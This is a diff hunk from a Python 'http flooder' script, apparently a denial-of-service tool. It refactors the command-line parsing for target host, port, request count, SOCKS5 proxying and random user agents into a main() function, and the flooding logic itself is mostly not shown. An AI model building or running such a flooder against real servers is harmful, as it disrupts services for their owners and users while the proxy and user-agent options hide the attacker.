@@ -64,57 +64,56 @@ def flood(args):
                 print(f'Sent {args.packets} instantly')
 
 
+def main():
+        parser = argparse.ArgumentParser(description= 'http flooder programmed in python')
+        parser.add_argument("host", help="target ip")
+        parser.add_argument(
+                '-p',
+                help='host port, usually 80 for webservers',
+                default=80,
+                dest='port',
+                type=int
+                )
+        parser.add_argument(
+                '-r',
+                help='number of requests to send',
+                default= 1,
+                dest='packets',
+                type=int
+                )
 
-parser = argparse.ArgumentParser(description= 'http flooder programmed in python')
-parser.add_argument("host", help="target ip")
-parser.add_argument(
-        '-p',
-        help='host port, usually 80 for webservers',
-        default=80,
-        dest='port',
-        type=int
-        )
-parser.add_argument(
-        '-r',
-        help='number of requests to send',
-        default= 1,
-        dest='packets',
-        type=int
-        )
+                
+        parser.add_argument(
+                "-x", "--useproxy",
+                dest="useproxy",
+                action="store_true",
+                help="Use a SOCKS5 proxy for connecting",
+                )
 
-        
-parser.add_argument(
-        "-x", "--useproxy",
-        dest="useproxy",
-        action="store_true",
-        help="Use a SOCKS5 proxy for connecting",
-        )
+        parser.add_argument(
+                '-H','--proxy-host',
+                help='host address of SOCKS5 proxy',
+                dest = 'proxyhost',
+                type= str
+                )
 
-parser.add_argument(
-        '-H','--proxy-host',
-        help='host address of SOCKS5 proxy',
-        dest = 'proxyhost',
-        type= str
-        )
+        parser.add_argument(
+                '-P','--proxy-port',
+                help='host port of SOCKS5 proxy',
+                dest = 'proxyport',
+                type=int
+                )
 
-parser.add_argument(
-        '-P','--proxy-port',
-        help='host port of SOCKS5 proxy',
-        dest = 'proxyport',
-        type=int
-        )
+        parser.add_argument(
+                '-ua', '--user-agent', '--user-agents',
+                dest='randagent',
+                action="store_true",
+                help='use a random user agent'
+                )
 
-parser.add_argument(
-        '-ua', '--user-agent', '--user-agents',
-        dest='randagent',
-        action="store_true",
-        help='use a random user agent'
-        )
-
-args = parser.parse_args()
-
-
-
+        args = parser.parse_args()
+        flood(args)
 
 
-flood(args)
+
+main()
